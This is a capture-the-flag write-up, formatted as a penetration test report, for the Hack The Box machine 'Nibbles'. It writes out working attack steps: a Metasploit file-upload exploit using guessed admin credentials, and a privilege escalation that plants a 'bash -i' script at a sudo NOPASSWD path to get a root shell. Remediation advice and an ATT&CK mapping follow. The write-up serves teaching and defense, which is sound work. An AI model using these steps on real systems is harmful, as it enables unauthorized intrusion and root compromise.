# Penetration Test Report — Nibbles

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-Nibbleblog%20%2F%20sudo%20NOPASSWD-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` identified a **Nibbleblog** CMS installation. A valid username was enumerated from a world-readable XML file and the admin password was manually guessed (a login blacklist prevented automated brute force). An authenticated file-upload vulnerability (Metasploit: `nibbleblog_file_upload`) provided a web shell. A `sudo NOPASSWD` entry pointing to a non-existent, user-creatable script was then abused for root access — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Username disclosure via `content/private/users.xml` | Medium |
| 2 | Weak admin credentials (`admin:nibbles`) | High |
| 3 | Authenticated arbitrary file upload in Nibbleblog | High |
| 4 | NOPASSWD sudo rule for a non-existent, attacker-creatable script | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
nmap -sC -sV target.htb
```

Only OpenSSH and Apache. The `index.html` source contained an HTML comment referencing `/nibbleblog/`; DirBuster confirmed `admin.php` within it.

### 2. Foothold — Nibbleblog File Upload

The Metasploit module `exploit/multi/http/nibbleblog_file_upload` requires valid credentials. A login blacklist blocked brute forcing, so:

1. Username enumerated from `http://target.htb/nibbleblog/content/private/users.xml` → `admin`.
2. Password **manually guessed** (few attempts; blacklist bypassed): `nibbles`.

```bash
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS target.htb
set USERNAME admin
set PASSWORD nibbles
run
```

Web shell obtained; user flag recovered.

### 3. Privilege Escalation — NOPASSWD Script

```bash
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The file did not exist, and the path was user-writable. A malicious script was created and executed with sudo:

```bash
mkdir -p /home/nibbler/personal/stuff
echo -e '#!/bin/bash\nbash -i' > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Root shell obtained; root flag recovered.

## Remediation

- Remove/replace Nibbleblog or restrict admin panel exposure; enforce strong, unique passwords and MFA where possible.
- Protect `content/private/` from direct web access.
- Sudo rules must reference absolute paths in root-owned, non-writable locations; audit NOPASSWD entries.
- Consider fail2ban-style controls *plus* credential hygiene — blacklists slow, not stop, weak passwords.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1078 — Valid Accounts (guessed creds) |
| Persistence/Execution | T1505.003 — Web Shell |
| Privilege Escalation | T1548.003 — Sudo abuse |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
